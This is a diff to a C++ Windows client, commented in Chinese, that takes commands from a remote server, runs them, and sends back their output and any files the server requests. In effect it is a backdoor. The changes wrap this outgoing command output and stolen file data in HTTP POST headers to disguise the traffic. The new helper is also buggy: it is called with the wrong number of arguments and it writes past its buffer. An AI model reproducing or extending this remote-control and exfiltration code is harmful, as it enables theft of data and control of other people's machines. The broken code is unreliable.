@@ -18,6 +18,7 @@ using namespace std;
 
 #define MAX_CMD_LEN		256
 #define MAC_ADDR_LEN	17
+#define POST_LEN		210
 #define DEFAULT_BUFLEN  1024
 char MacAddr[MAC_ADDR_LEN];
 char cmdbuffer[DEFAULT_BUFLEN] = { 0 };          //用1024的空间来存储输出的内容，只要不是显示文件内容，一般情况下是够用了。  
@@ -58,6 +59,16 @@ int getFileSizeSystemCall(char * strFileName)
 	struct stat temp;
 	stat(strFileName, &temp);
 	return temp.st_size;
+}
+
+char* combine(char *s1, char *s2, int len)
+{
+	char *result = (char *)malloc(len + 1);
+	if (result == NULL) exit(1);
+	strcpy(result, s1);
+	for (int i = POST_LEN; i <= len + 1; i++)
+		result[i] = s2[i - POST_LEN];
+	return result;
 }
 
 void init()
@@ -196,10 +207,6 @@ int main(int argc, char * argv[])
 			cout << "Send Info Error::" << GetLastError() << endl;
 			break;
 		}
-
-
-		
-
 		//
 		// recv cmd information
 		//
@@ -240,7 +247,17 @@ int main(int argc, char * argv[])
 				memset(cmdbuffer, 0, sizeof(cmdbuffer));
 				suc = execmd(pStrCmd,cmdbuffer);
 				int iResult;
-				if (suc) iResult = send(ClientSocket, cmdbuffer, DEFAULT_BUFLEN, 0);
+				if (suc)
+				{
+					//iResult = send(ClientSocket, cmdbuffer, DEFAULT_BUFLEN, 0);
+					Ret = send(ClientSocket, combine(PostHead, cmdbuffer), DEFAULT_BUFLEN + strlen(PostHead), 0);
+					cout << "发送POST请求,包含执行命令返回值：" << MacAddr << endl;
+					if (Ret != DEFAULT_BUFLEN + strlen(PostHead))
+					{
+						cout << "Send Info Error::" << GetLastError() << endl;
+						break;
+					}
+				}
 				else iResult = send(ClientSocket, error, DEFAULT_BUFLEN, 0);
 				if (iResult == SOCKET_ERROR) {
 					printf("发送失败！错误编号: %d\n", WSAGetLastError());
@@ -254,7 +271,7 @@ int main(int argc, char * argv[])
 				// read file and send to server
 				printf("download file: %s\n", pStrCmd);
 				
-				char sendbuf[DEFAULT_BUFLEN];
+				char sendbuf[DEFAULT_BUFLEN+1];
 				FILE *file = NULL;
 				char *filename = pStrCmd;
 				file = fopen(filename, "rb");
@@ -277,17 +294,12 @@ int main(int argc, char * argv[])
 					fread(sendbuf, 1, DEFAULT_BUFLEN, file);
 					int iSend = DEFAULT_BUFLEN;
 					if (tosendlen < DEFAULT_BUFLEN) iSend = tosendlen;
-					iResult = send(ClientSocket, sendbuf, iSend, 0);
-					printf("装填成功！\n");
-
-					if (iResult == SOCKET_ERROR) {
-						printf("发送失败！错误编号: %d\n", WSAGetLastError());
-						closesocket(ClientSocket);
-						WSACleanup();
-						return 1;
-					}
-					//printf("发射成功: %s(%ld)\n\n", sendbuf, iResult);
-					tosendlen -= iResult;
+					//iResult = send(ClientSocket, sendbuf, iSend, 0);
+					sendbuf[DEFAULT_BUFLEN] = '\0';
+					printf("发送数据:  %s(%d)\n", sendbuf, iSend);
+					iResult = send(ClientSocket, combine(PostHead, sendbuf, iSend + strlen(PostHead)), iSend + strlen(PostHead), 0);
+					cout << "发送POST请求,包含文件数据,传送中。。。"  << endl;
+					tosendlen -= iSend;
 				}
 
 				fclose(file);
